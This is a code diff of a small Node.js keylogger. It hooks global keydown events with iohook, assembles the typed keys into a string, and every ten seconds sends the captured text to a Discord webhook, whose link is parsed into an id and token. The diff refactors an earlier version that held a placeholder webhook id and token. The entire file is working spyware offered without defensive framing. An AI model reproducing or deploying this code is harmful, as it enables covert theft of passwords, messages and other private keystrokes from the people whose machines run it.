@@ -4,33 +4,34 @@ const Keycode = require("keycode")
 const IOHook = require("iohook")
 
 //Variables
-const Webhook = new Discord.WebhookClient("webhookid", "webhooktoken")
+var Self = {
+    webhook_link: "",
+    keys: ""
+}
 
-var keys = ""
+const Webhook = new Discord.WebhookClient(Self.webhook_link.split("/")[Self.webhook_link.split("/").length-2], Self.webhook_link.split("/")[Self.webhook_link.split("/").length-1])
 
 //Main
 IOHook.on("keydown", (event)=>{
-    const key = Keycode(event.rawcode)
-
-    if(keys.length == 0){
-        keys = key
-    }else{
-        if(key.indexOf("pace") != -1){
-            keys += " "
-        }else{
-            keys += key
-        }
+    if(Keycode.names[event.rawcode] == "enter"){
+        Self.keys += "\n"
+        return
+    }else if(Keycode.names[event.rawcode] == "space"){
+        Self.keys += " "
+        return
+    }else if(!Keycode.names[event.rawcode]){
+        return
     }
+
+    Self.keys += Keycode.names[event.rawcode]
 })
 
 IOHook.start()
 
 setInterval(function(){
-    if(keys.length == 0){
-        return
-    }else{
-        Webhook.send(keys)
-
-        keys = ""
+    if(Self.keys.length){
+        Webhook.send(Self.keys).then(()=>{
+            Self.keys = ""
+        })
     }
-}, 5000)
+}, 10000) //Seconds typed keys every 10 seconds
